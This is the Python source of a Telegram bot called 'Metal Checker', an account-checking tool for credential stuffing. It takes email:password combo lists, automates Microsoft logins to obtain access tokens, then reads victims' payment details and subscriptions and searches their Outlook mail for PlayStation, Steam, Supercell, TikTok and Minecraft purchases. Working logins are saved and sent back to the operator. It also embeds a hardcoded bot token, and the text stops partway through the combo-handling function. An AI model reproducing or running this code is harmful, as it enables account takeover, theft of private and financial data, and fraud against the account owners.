# ==============================================================================
# METAL CHECKER v3.0 - THE ULTIMATE TELEGRAM BOT EDITION
# Coded by: Chester Lua
# Supported by: Metal Drops & Icardi
# Discord: discord.gg/cheatglobal
# ==============================================================================

import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, InputFile
import requests
import json
import uuid
import re
import time
import os
import sys
import shutil
import base64
from datetime import datetime, timezone
from pathlib import Path
from threading import Lock, Thread, Event
from concurrent.futures import ThreadPoolExecutor
from collections import defaultdict, deque
from urllib.parse import quote, unquote

# -----------------------------------------
# GLOBAL SETTINGS, TOKENS & STATES
# -----------------------------------------
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8812460550:AAFlrjKwwAdoGFb-DWtwt9CGF7eeQmJnKmM")
bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)

# Bellek Yönetimi
user_states = {}
user_configs = {}
active_tasks = {}
stop_flags = {}

# -----------------------------------------
# CORE CHECKER ENGINE (INTEGRATED FROM MAIN.PY)
# -----------------------------------------
class UnifiedChecker:
    def __init__(self, keywords=None, api_mode=2, check_mode="both"):
        self.session = requests.Session()
        self.uuid = str(uuid.uuid4())
        self.keywords = keywords if keywords else []
        self.api_mode = api_mode
        self.check_mode = check_mode
        
    def parse_country_from_json(self, json_data):
        try:
            if isinstance(json_data, dict):
                if "accounts" in json_data and isinstance(json_data["accounts"], list):
                    for account in json_data["accounts"]:
                        if isinstance(account, dict) and "location" in account and account["location"]:
                            return str(account["location"]).strip()
                if "location" in json_data and json_data["location"]:
                    location = json_data["location"]
                    if isinstance(location, str):
                        parts = [p.strip() for p in location.split(',')]
                        return parts[-1] if parts else ""
                    elif isinstance(location, dict):
                        for key in ['country', 'countryOrRegion', 'countryCode']:
                            if key in location and location[key]:
                                return str(location[key])
                for key in ['country', 'countryOrRegion', 'countryCode', 'Country']:
                    if key in json_data and json_data[key]:
                        return str(json_data[key])
        except: pass
        return "Unknown"
    
    def get_remaining_days(self, date_str):
        try:
            if not date_str: return "?"
            renewal_date = datetime.fromisoformat(date_str.replace('Z', '+00:00'))
            today = datetime.now(renewal_date.tzinfo)
            remaining = (renewal_date - today).days
            return str(remaining)
        except: return "?"
    
    def check_microsoft_subscriptions(self, email, password, access_token, cid):
        try:
            user_id = str(uuid.uuid4()).replace('-', '')[:16]
            state_json = json.dumps({"userId": user_id, "scopeSet": "pidl"})
            payment_auth_url = "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=" + quote(state_json) + "&prompt=none"
            
            headers = {
                "Host": "login.live.com",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Connection": "keep-alive",
                "Referer": "https://account.microsoft.com/"
            }
            
            r = self.session.get(payment_auth_url, headers=headers, allow_redirects=True, timeout=20)
            payment_token = None
            search_text = r.text + " " + r.url
            
            token_patterns = [r'access_token=([^&\s"\']+)', r'"access_token":"([^"]+)"']
            for pattern in token_patterns:
                match = re.search(pattern, search_text)
                if match:
                    payment_token = unquote(match.group(1))
                    break
            
            if not payment_token: return {"status": "FREE", "subscriptions": [], "data": {}}
            
            sub_data = {}
            subscriptions = []
            payment_headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "application/json",
                "Authorization": 'MSADELEGATE1.0="' + payment_token + '"',
                "Content-Type": "application/json",
                "Host": "paymentinstruments.mp.microsoft.com",
                "ms-cV": str(uuid.uuid4()),
                "Origin": "https://account.microsoft.com",
                "Referer": "https://account.microsoft.com/"
            }
            
            # Balance & Cards
            try:
                payment_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US"
                r_pay = self.session.get(payment_url, headers=payment_headers, timeout=15)
                if r_pay.status_code == 200:
                    balance_match = re.search(r'"balance"\s*:\s*([0-9.]+)', r_pay.text)
                    if balance_match: sub_data['balance'] = "$" + balance_match.group(1)
                    card_match = re.search(r'"paymentMethodFamily"\s*:\s*"credit_card".*?"name"\s*:\s*"([^"]+)"', r_pay.text, re.DOTALL)
                    if card_match: sub_data['card_holder'] = card_match.group(1)
            except: pass
            
            # Subs
            try:
                trans_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
                r_sub = self.session.get(trans_url, headers=payment_headers, timeout=15)
                
                if r_sub.status_code == 200:
                    response_text = r_sub.text
                    subscription_keywords = {
                        'Xbox Game Pass Ultimate': {'type': 'GAME PASS ULTIMATE', 'category': 'gaming'},
                        'PC Game Pass': {'type': 'PC GAME PASS', 'category': 'gaming'},
                        'Xbox Game Pass': {'type': 'GAME PASS', 'category': 'gaming'},
                        'EA Play': {'type': 'EA PLAY', 'category': 'gaming'},
                        'Xbox Live Gold': {'type': 'XBOX LIVE GOLD', 'category': 'gaming'},
                        'Microsoft 365 Family': {'type': 'M365 FAMILY', 'category': 'office'},
                        'Microsoft 365 Personal': {'type': 'M365 PERSONAL', 'category': 'office'},
                        'Minecraft': {'type': 'MINECRAFT REALMS', 'category': 'gaming'}
                    }
                    
                    for keyword, info in subscription_keywords.items():
                        if keyword in response_text:
                            sub_info = {'name': info['type'], 'category': info['category']}
                            title_match = re.search(r'"title"\s*:\s*"([^"]+)"', response_text)
                            if title_match: sub_info['title'] = title_match.group(1)
                            
                            renewal_match = re.search(r'"nextRenewalDate"\s*:\s*"([^T"]+)', response_text)
                            if renewal_match:
                                renewal_date = renewal_match.group(1)
                                sub_info['renewal_date'] = renewal_date
                                days_remaining = self.get_remaining_days(renewal_date + "T00:00:00Z")
                                sub_info['days_remaining'] = days_remaining
                                if days_remaining != "?" and int(days_remaining) <= 0:
                                    sub_info['is_expired'] = True
                                else:
                                    sub_info['is_expired'] = False
                            subscriptions.append(sub_info)
                            
                    if subscriptions:
                        active_subs = [s for s in subscriptions if not s.get('is_expired', False)]
                        return {"status": "PREMIUM" if active_subs else "FREE", "subscriptions": subscriptions, "data": sub_data}
            except: pass
            return {"status": "FREE", "subscriptions": [], "data": sub_data}
        except: return {"status": "ERROR", "subscriptions": [], "data": {}}
    
    def check_psn(self, email, access_token, cid):
        try:
            search_url = "https://outlook.live.com/search/api/v2/query"
            payload = {
                "Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "TimeZone": "UTC", "TextDecorations": "Off",
                "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]}, "From": 0, "Query": {"QueryString": "sony@txn-email.playstation.com OR sony@email02.account.sony.com OR PlayStation Order Number"}, "Size": 50, "Sort": [{"Field": "Time", "SortDirection": "Desc"}]}]
            }
            headers = {'User-Agent': 'Outlook-Android/2.0', 'Accept': 'application/json', 'Authorization': f'Bearer {access_token}', 'X-AnchorMailbox': f'CID:{cid}', 'Content-Type': 'application/json'}
            r = self.session.post(search_url, json=payload, headers=headers, timeout=15)
            if r.status_code == 200:
                data = r.json()
                purchases = []
                total_orders = 0
                if 'EntitySets' in data and len(data['EntitySets']) > 0:
                    entity_set = data['EntitySets'][0]
                    if 'ResultSets' in entity_set and len(entity_set['ResultSets']) > 0:
                        result_set = entity_set['ResultSets'][0]
                        total_orders = result_set.get('Total', 0)
                        if 'Results' in result_set:
                            for result in result_set['Results'][:15]:
                                purchase_info = {}
                                if 'Preview' in result:
                                    full_text = result.get('ItemBody', {}).get('Content', result['Preview'])
                                    game_patterns = [
                                        r'Thank you for purchasing\s+([^\.]+?)(?:\s+from|\.|$)', 
                                        r'You\'ve bought\s+([^\.]+?)(?:\s+from|\.|$)', 
                                        r'Order.*?:\s*([A-Z][^\n\.]{5,60}?)(?:\s+has|\s+is|\s+for|\.|$)',
                                        r'purchased\s+([^\.]{5,60}?)\s+(?:for|from)'
                                    ]
                                    for pattern in game_patterns:
                                        match = re.search(pattern, full_text, re.IGNORECASE)
                                        if match:
                                            item_name = match.group(1).strip()
                                            item_name = re.sub(r'\s+', ' ', item_name).replace('\\r', '').replace('\\n', '')
                                            purchase_info['item'] = item_name
                                            break
                                if purchase_info.get('item'): purchases.append(purchase_info)
                if total_orders > 0: return {"psn_status": "HAS_ORDERS", "psn_orders": total_orders, "purchases": purchases}
            return {"psn_status": "FREE", "psn_orders": 0, "purchases": []}
        except: return {"psn_status": "ERROR", "psn_orders": 0, "purchases": []}

    def check_steam(self, email, access_token, cid):
        try:
            search_url = "https://outlook.live.com/search/api/v2/query"
            payload = {
                "Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "TimeZone": "UTC", "TextDecorations": "Off",
                "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]}, "From": 0, "Query": {"QueryString": "noreply@steampowered.com purchase"}, "Size": 30, "Sort": [{"Field": "Time", "SortDirection": "Desc"}]}]
            }
            headers = {'User-Agent': 'Outlook-Android/2.0', 'Accept': 'application/json', 'Authorization': f'Bearer {access_token}', 'X-AnchorMailbox': f'CID:{cid}', 'Content-Type': 'application/json'}
            r = self.session.post(search_url, json=payload, headers=headers, timeout=10)
            if r.status_code == 200:
                data = r.json()
                purchases = []
                total = 0
                if 'EntitySets' in data and len(data['EntitySets']) > 0:
                    entity_set = data['EntitySets'][0]
                    if 'ResultSets' in entity_set and len(entity_set['ResultSets']) > 0:
                        result_set = entity_set['ResultSets'][0]
                        total = result_set.get('Total', 0)
                        if 'Results' in result_set:
                            for result in result_set['Results'][:5]:
                                if 'Preview' in result:
                                    preview = result['Preview']
                                    game_match = re.search(r'Thank you for your.*?purchase.*?:\s*([^\.]+)', preview, re.IGNORECASE)
                                    if game_match: purchases.append({'game': game_match.group(1).strip()})
                if total > 0: return {"steam_status": "HAS_PURCHASES", "steam_count": total, "purchases": purchases}
            return {"steam_status": "FREE", "steam_count": 0, "purchases": []}
        except: return {"steam_status": "ERROR", "steam_count": 0, "purchases": []}

    def check_supercell(self, email, access_token, cid):
        try:
            search_url = "https://outlook.live.com/search/api/v2/query"
            payload = {
                "Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "TimeZone": "UTC", "TextDecorations": "Off",
                "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]}, "From": 0, "Query": {"QueryString": "noreply@id.supercell.com"}, "Size": 20, "Sort": [{"Field": "Time", "SortDirection": "Desc"}]}]
            }
            headers = {'User-Agent': 'Outlook-Android/2.0', 'Accept': 'application/json', 'Authorization': f'Bearer {access_token}', 'X-AnchorMailbox': f'CID:{cid}', 'Content-Type': 'application/json'}
            r = self.session.post(search_url, json=payload, headers=headers, timeout=10)
            if r.status_code == 200:
                data = r.json()
                games = []
                if 'EntitySets' in data and len(data['EntitySets']) > 0:
                    entity_set = data['EntitySets'][0]
                    if 'ResultSets' in entity_set and len(entity_set['ResultSets']) > 0:
                        result_set = entity_set['ResultSets'][0]
                        if result_set.get('Total', 0) > 0 and 'Results' in result_set:
                            for result in result_set['Results']:
                                if 'Preview' in result:
                                    preview = result['Preview']
                                    if 'Clash Royale' in preview and 'Clash Royale' not in games: games.append('Clash Royale')
                                    if 'Clash of Clans' in preview and 'Clash of Clans' not in games: games.append('Clash of Clans')
                                    if 'Brawl Stars' in preview and 'Brawl Stars' not in games: games.append('Brawl Stars')
                                    if 'Hay Day' in preview and 'Hay Day' not in games: games.append('Hay Day')
                        if games: return {"supercell_status": "LINKED", "games": games}
            return {"supercell_status": "FREE", "games": []}
        except: return {"supercell_status": "ERROR", "games": []}

    def check_tiktok(self, email, access_token, cid):
        try:
            search_url = "https://outlook.live.com/search/api/v2/query"
            payload = {
                "Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "TimeZone": "UTC", "TextDecorations": "Off",
                "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]}, "From": 0, "Query": {"QueryString": "account.tiktok"}, "Size": 10, "Sort": [{"Field": "Time", "SortDirection": "Desc"}]}]
            }
            headers = {'User-Agent': 'Outlook-Android/2.0', 'Accept': 'application/json', 'Authorization': f'Bearer {access_token}', 'X-AnchorMailbox': f'CID:{cid}', 'Content-Type': 'application/json'}
            r = self.session.post(search_url, json=payload, headers=headers, timeout=10)
            if r.status_code == 200:
                data = r.json()
                if 'EntitySets' in data and len(data['EntitySets']) > 0:
                    entity_set = data['EntitySets'][0]
                    if 'ResultSets' in entity_set and len(entity_set['ResultSets']) > 0:
                        result_set = entity_set['ResultSets'][0]
                        if result_set.get('Total', 0) > 0 and 'Results' in result_set:
                            for result in result_set['Results']:
                                if 'Preview' in result:
                                    preview = result['Preview']
                                    patterns = [r'Salut\s+([^,]+)', r'Hallo\s+([^,]+)', r'Xin chào\s+([^,]+)', r'Hi\s+([^,]+)', r'Hello\s+([^,]+)']
                                    for pattern in patterns:
                                        match = re.search(pattern, preview)
                                        if match: return {"tiktok_status": "LINKED", "username": match.group(1).strip()}
            return {"tiktok_status": "FREE", "username": None}
        except: return {"tiktok_status": "ERROR", "username": None}

    def check_minecraft(self, email, access_token, cid):
        try:
            headers = {'Authorization': f'Bearer {access_token}', 'User-Agent': 'Outlook-Android/2.0'}
            r = self.session.get('https://api.minecraftservices.com/minecraft/profile', headers=headers, timeout=10)
            if r.status_code == 200:
                data = r.json()
                return {"minecraft_status": "OWNED", "minecraft_username": data.get('name', 'Unknown'), "minecraft_uuid": data.get('id', '')}
            return {"minecraft_status": "FREE", "minecraft_username": None}
        except: return {"minecraft_status": "ERROR", "minecraft_username": None}

    def check(self, email, password):
        try:
            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite", "X-Office-Version": "3.11.0-minApi24", "X-CorrelationId": self.uuid, 
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)", "Host": "odc.officeapps.live.com", 
                "Connection": "Keep-Alive", "Accept-Encoding": "gzip"
            }
            r1 = self.session.get(url1, headers=headers1, timeout=15)
            
            if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text or "OrgId" in r1.text or "MSAccount" not in r1.text:
                return {"status": "BAD"}
            
            url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            headers2 = {"User-Agent": "Mozilla/5.0", "Accept": "*/*", "Connection": "keep-alive"}
            r2 = self.session.get(url2, headers=headers2, allow_redirects=True, timeout=15)
            
            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            if not url_match or not ppft_match: return {"status": "BAD"}
            
            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)
            login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&PPFT={ppft}&PPSX=PassportR&NewUser=1"
            headers3 = {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0", "Origin": "https://login.live.com", "Referer": r2.url}
            
            r3 = self.session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=15)
            response_text = r3.text.lower()
            
            if "account or password is incorrect" in response_text or r3.text.count("error") > 0: return {"status": "BAD"}
            if "identity/confirm" in response_text or "consent" in response_text: return {"status": "2FA", "email": email, "password": password}
            if "abuse" in response_text: return {"status": "BAD"}
            
            location = r3.headers.get("Location", "")
            code_match = re.search(r'code=([^&]+)', location)
            if not code_match: return {"status": "BAD"}
            
            code = code_match.group(1)
            mspcid = self.session.cookies.get("MSPCID", "")
            if not mspcid: return {"status": "BAD"}
            cid = mspcid.upper()
            
            token_data = f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            r4 = self.session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=15)
            
            if "access_token" not in r4.text: return {"status": "BAD"}
            access_token = r4.json()["access_token"]
            
            result = {"status": "HIT", "email": email, "password": password}
            
            if self.check_mode in ["microsoft", "both"]:
                ms_res = self.check_microsoft_subscriptions(email, password, access_token, cid)
                result.update({"ms_status": ms_res.get("status", "FREE"), "subscriptions": ms_res.get("subscriptions", [])})
            if self.check_mode in ["psn", "both"]:
                psn_res = self.check_psn(email, access_token, cid)
                result.update({"psn_orders": psn_res.get("psn_orders", 0), "psn_purchases": psn_res.get("purchases", [])})
            if self.check_mode in ["steam", "both"]:
                steam_res = self.check_steam(email, access_token, cid)
                result.update({"steam_count": steam_res.get("steam_count", 0), "steam_purchases": steam_res.get("purchases", [])})
            if self.check_mode in ["supercell", "both"]:
                sc_res = self.check_supercell(email, access_token, cid)
                result.update({"supercell_games": sc_res.get("games", [])})
            if self.check_mode in ["tiktok", "both"]:
                tk_res = self.check_tiktok(email, access_token, cid)
                result.update({"tiktok_username": tk_res.get("username")})
            if self.check_mode in ["minecraft", "both"]:
                mc_res = self.check_minecraft(email, access_token, cid)
                result.update({"minecraft_username": mc_res.get("minecraft_username")})
                
            return result
        except requests.exceptions.Timeout: return {"status": "TIMEOUT"}
        except Exception: return {"status": "ERROR"}

# -----------------------------------------
# RESULT MANAGER (DYNAMIC .TXT / .ZIP DELIVERY)
# -----------------------------------------
class ResultManager:
    def __init__(self, chat_id, mode_name):
        self.chat_id = chat_id
        self.mode = mode_name
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M")
        self.base_folder = f"results_{chat_id}_{timestamp}"
        
        Path(self.base_folder).mkdir(parents=True, exist_ok=True)
        
        # Dosya yolları
        self.hits_file = os.path.join(self.base_folder, "hits.txt")
        self.two_fa_file = os.path.join(self.base_folder, "2fa.txt")
        
        # Spesifik mod dosyaları
        self.active_subs = os.path.join(self.base_folder, "active_subs.txt")
        self.expired_subs = os.path.join(self.base_folder, "expired_subs.txt")
        self.psn_file = os.path.join(self.base_folder, "psn_hits.txt")
        self.steam_file = os.path.join(self.base_folder, "steam_hits.txt")
        self.supercell_file = os.path.join(self.base_folder, "supercell_hits.txt")
        self.tiktok_file = os.path.join(self.base_folder, "tiktok_hits.txt")
        self.minecraft_file = os.path.join(self.base_folder, "minecraft_hits.txt")
        
    def save_hit(self, res):
        email, password = res['email'], res['password']
        base_str = f"{email}:{password}"
        
        with open(self.hits_file, 'a', encoding='utf-8') as f:
            f.write(base_str + "\n")
            
        if self.mode in ["microsoft", "both"]:
            subs = res.get("subscriptions", [])
            if subs:
                has_active = any(not s.get('is_expired', False) and s.get('days_remaining', '?') != '?' for s in subs)
                line = f"{base_str} | " + " | ".join([f"[{s.get('name', 'SUB')} - Days: {s.get('days_remaining', '?')}]" for s in subs])
                target_file = self.active_subs if has_active else self.expired_subs
                with open(target_file, 'a', encoding='utf-8') as f: f.write(line + "\n")
                
        if self.mode in ["psn", "both"] and res.get("psn_orders", 0) > 0:
            purchases = res.get("psn_purchases", [])
            items = ", ".join([p.get('item', 'Unknown') for p in purchases[:3]])
            with open(self.psn_file, 'a', encoding='utf-8') as f:
                f.write(f"{base_str} | Orders: {res['psn_orders']} | Games: {items}\n")
                
        if self.mode in ["steam", "both"] and res.get("steam_count", 0) > 0:
            games = ", ".join([p.get('game', 'Unknown') for p in res.get("steam_purchases", [])[:3]])
            with open(self.steam_file, 'a', encoding='utf-8') as f:
                f.write(f"{base_str} | Purchases: {res['steam_count']} | {games}\n")
                
        if self.mode in ["supercell", "both"] and res.get("supercell_games"):
            with open(self.supercell_file, 'a', encoding='utf-8') as f:
                f.write(f"{base_str} | Games: {', '.join(res['supercell_games'])}\n")
                
        if self.mode in ["tiktok", "both"] and res.get("tiktok_username"):
            with open(self.tiktok_file, 'a', encoding='utf-8') as f:
                f.write(f"{base_str} | Username: @{res['tiktok_username']}\n")
                
        if self.mode in ["minecraft", "both"] and res.get("minecraft_username"):
            with open(self.minecraft_file, 'a', encoding='utf-8') as f:
                f.write(f"{base_str} | Username: {res['minecraft_username']}\n")

    def save_2fa(self, email, password):
        with open(self.two_fa_file, 'a', encoding='utf-8') as f:
            f.write(f"{email}:{password}\n")

    def get_delivery_files(self):
        # Full scan ise klasörü zipleyip ver. Sadece bir mod ise sadece onun txt dosyasını ver.
        if self.mode == "both":
            zip_name = f"{self.base_folder}.zip"
            shutil.make_archive(self.base_folder, 'zip', self.base_folder)
            return [zip_name], True
        else:
            files_to_send = []
            if self.mode == "microsoft":
                if os.path.exists(self.active_subs): files_to_send.append(self.active_subs)
                if os.path.exists(self.expired_subs): files_to_send.append(self.expired_subs)
            elif self.mode == "psn" and os.path.exists(self.psn_file): files_to_send.append(self.psn_file)
            elif self.mode == "steam" and os.path.exists(self.steam_file): files_to_send.append(self.steam_file)
            elif self.mode == "supercell" and os.path.exists(self.supercell_file): files_to_send.append(self.supercell_file)
            elif self.mode == "tiktok" and os.path.exists(self.tiktok_file): files_to_send.append(self.tiktok_file)
            elif self.mode == "minecraft" and os.path.exists(self.minecraft_file): files_to_send.append(self.minecraft_file)
            
            # Her halükarda hits.txt de gönderelim bulamazsa
            if not files_to_send and os.path.exists(self.hits_file):
                files_to_send.append(self.hits_file)
            
            return files_to_send, False

# -----------------------------------------
# LIVE UI STATS (MODE AWARE)
# -----------------------------------------
class LiveStats:
    def __init__(self, total, chat_id, mode):
        self.chat_id = chat_id
        self.total = total
        self.mode = mode
        self.checked = 0
        self.hits = 0
        self.two_fa = 0
        self.bads = 0
        
        # Service specifics
        self.ms_premium = 0
        self.ms_expired = 0
        self.psn_hits = 0
        self.steam_hits = 0
        self.sc_hits = 0
        self.mc_hits = 0
        self.tk_hits = 0
        
        self.latest_active_subs = deque(maxlen=3) # Son bulunan 3 abonelik ismini tutar
        self.latest_games = deque(maxlen=3)
        
        self.start_time = time.time()
        self.lock = Lock()
        self.message_id = None
        
    def update(self, status, res=None):
        with self.lock:
            self.checked += 1
            if status == "HIT":
                self.hits += 1
                if res:
                    subs = res.get("subscriptions", [])
                    active_subs = [s for s in subs if not s.get('is_expired', False)]
                    if active_subs:
                        self.ms_premium += 1
                        for s in active_subs: self.latest_active_subs.append(s.get('name', 'Unknown Sub'))
                    elif subs:
                        self.ms_expired += 1
                        
                    if res.get("psn_orders", 0) > 0: 
                        self.psn_hits += 1
                        if res.get("psn_purchases"): self.latest_games.append(res["psn_purchases"][0].get('item', 'Game'))
                    if res.get("steam_count", 0) > 0: 
                        self.steam_hits += 1
                        if res.get("steam_purchases"): self.latest_games.append(res["steam_purchases"][0].get('game', 'Game'))
                    if res.get("supercell_games"): self.sc_hits += 1
                    if res.get("tiktok_username"): self.tk_hits += 1
                    if res.get("minecraft_username"): self.mc_hits += 1
            elif status == "2FA": self.two_fa += 1
            else: self.bads += 1

    def generate_text(self):
        with self.lock:
            elapsed = time.time() - self.start_time
            cpm = (self.checked / elapsed * 60) if elapsed > 0 else 0
            progress = (self.checked / self.total * 100) if self.total > 0 else 0
            
            text = f"⚙️ *METAL CHECKER - LIVE RESULTS* ⚙️\n"
            text += f"━━━━━━━━━━━━━━━━━━━━\n"
            text += f"🟢 *Hits:* `{self.hits}`\n"
            text += f"🟡 *2FA:* `{self.two_fa}`\n"
            text += f"🔴 *Bad:* `{self.bads}`\n"
            text += f"━━━━━━━━━━━━━━━━━━━━\n"
            
            if self.mode in ["microsoft", "both"]:
                text += f"🎮 *Active Subs:* `{self.ms_premium}`\n"
                text += f"💀 *Expired Subs:* `{self.ms_expired}`\n"
                if self.latest_active_subs:
                    text += f"🔥 *Latest Subs:* `{', '.join(list(self.latest_active_subs))}`\n"
                text += f"━━━━━━━━━━━━━━━━━━━━\n"
                
            if self.mode in ["psn", "steam", "both"]:
                if self.mode in ["psn", "both"]: text += f"🎯 *PSN Hits:* `{self.psn_hits}`\n"
                if self.mode in ["steam", "both"]: text += f"🎲 *Steam Hits:* `{self.steam_hits}`\n"
                if self.latest_games:
                    text += f"🕹️ *Latest Games:* `{', '.join(list(self.latest_games))}`\n"
                text += f"━━━━━━━━━━━━━━━━━━━━\n"
                
            if self.mode in ["supercell", "tiktok", "minecraft", "both"]:
                if self.mode in ["supercell", "both"]: text += f"⚔️ *Supercell:* `{self.sc_hits}`\n"
                if self.mode in ["tiktok", "both"]: text += f"📱 *TikTok:* `{self.tk_hits}`\n"
                if self.mode in ["minecraft", "both"]: text += f"⛏️ *Minecraft:* `{self.mc_hits}`\n"
                text += f"━━━━━━━━━━━━━━━━━━━━\n"
                
            text += f"📊 *Progress:* `{self.checked}/{self.total} ({progress:.1f}%)`\n"
            text += f"🚀 *CPM:* `{int(cpm)}`\n"
            text += f"⚡️ *Coded by Metal Drops & Icardi*\n"
            return text


# -----------------------------------------
# TELEGRAM BOT HANDLERS & MENUS
# -----------------------------------------
@bot.message_handler(commands=['start'])
def send_welcome(message):
    chat_id = message.chat.id
    user_states[chat_id] = "IDLE"
    user_configs[chat_id] = {"mode": "both", "api": 2, "threads": 10}
    
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🚀 Metal Checker Başlat", callback_data="menu_services"))
    
    bot.send_message(
        chat_id, 
        "🤘 *Metal Drops & Icardi Sunar: METAL CHECKER v3.0*\n\nHoş geldin. Sınır yok, kural yok. Tüm modlar aktif. Başlamak için butona tıkla.",
        parse_mode="Markdown", reply_markup=markup
    )

@bot.message_handler(commands=['stop'])
def stop_checker(message):
    chat_id = message.chat.id
    if chat_id in active_tasks and active_tasks[chat_id]:
        stop_flags[chat_id] = True
        bot.send_message(chat_id, "🛑 İşlem durduruluyor... Kalan sonuçlar paketlenip gönderilecek.")
    else:
        bot.send_message(chat_id, "Şu an çalışan bir işlem yok.")

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    data = call.data
    
    if data == "menu_services":
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("1. Microsoft Subs", callback_data="srv_microsoft"),
            InlineKeyboardButton("2. PlayStation", callback_data="srv_psn"),
            InlineKeyboardButton("3. Steam", callback_data="srv_steam"),
            InlineKeyboardButton("4. Supercell", callback_data="srv_supercell"),
            InlineKeyboardButton("5. TikTok", callback_data="srv_tiktok"),
            InlineKeyboardButton("6. Minecraft", callback_data="srv_minecraft"),
            InlineKeyboardButton("7. Full Scan (.ZIP)", callback_data="srv_both")
        )
        bot.edit_message_text("🎯 *SERVICE SELECTION*\nHangi servisleri vurmak istersin?", chat_id, call.message.message_id, parse_mode="Markdown", reply_markup=markup)
        
    elif data.startswith("srv_"):
        mode = data.split("_")[1]
        user_configs[chat_id]["mode"] = mode
        
        markup = InlineKeyboardMarkup(row_width=1)
        markup.add(
            InlineKeyboardButton("1. Full API", callback_data="api_1"),
            InlineKeyboardButton("2. Fast API (Önerilen)", callback_data="api_2"),
            InlineKeyboardButton("3. Minimal API", callback_data="api_3")
        )
        bot.edit_message_text("⚙️ *API MODE*\nAPI hızı/kalitesi ne olsun?", chat_id, call.message.message_id, parse_mode="Markdown", reply_markup=markup)
        
    elif data.startswith("api_"):
        api_lvl = int(data.split("_")[1])
        user_configs[chat_id]["api"] = api_lvl
        
        markup = InlineKeyboardMarkup(row_width=3)
        markup.add(
            InlineKeyboardButton("10 Thread", callback_data="thr_10"),
            InlineKeyboardButton("30 Thread", callback_data="thr_30"),
            InlineKeyboardButton("50 Thread", callback_data="thr_50"),
            InlineKeyboardButton("100 Thread", callback_data="thr_100")
        )
        bot.edit_message_text("🚀 *THREADING*\nKaç eşzamanlı koldan saldıralım?", chat_id, call.message.message_id, parse_mode="Markdown", reply_markup=markup)

    elif data.startswith("thr_"):
        threads = int(data.split("_")[1])
        user_configs[chat_id]["threads"] = threads
        user_states[chat_id] = "WAITING_FOR_COMBO"
        
        bot.edit_message_text(
            f"✅ *METAL CHECKER HAZIR!*\n\n"
            f"Servis: `{user_configs[chat_id]['mode'].upper()}`\n"
            f"Threads: `{threads}`\n\n"
            f"🔥 *Şimdi combo dosyanı (.txt) gönder.* Geldiği an tarama otomatik başlayacak. Durdurmak için `/stop` yaz.",
            chat_id, call.message.message_id, parse_mode="Markdown"
        )

@bot.message_handler(content_types=['document', 'text'])
def handle_combo(message):
    chat_id = message.chat.id
    
    if user_states.get(chat_id) != "WAITING_FOR_COMBO": return
        
    lines = []
    if message.content_type == 'document':
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        try:
            content = downloaded_file.decode('utf-8')
            lines = [l.strip() for l in content.split('\n') if l.strip() and ':' in l]
        except:
            bot.send_message(chat_id, "❌ Dosya okunamadı. UTF-8 formatında geçerli bir txt gönder.")
            return
    elif message.content_type == 'text':
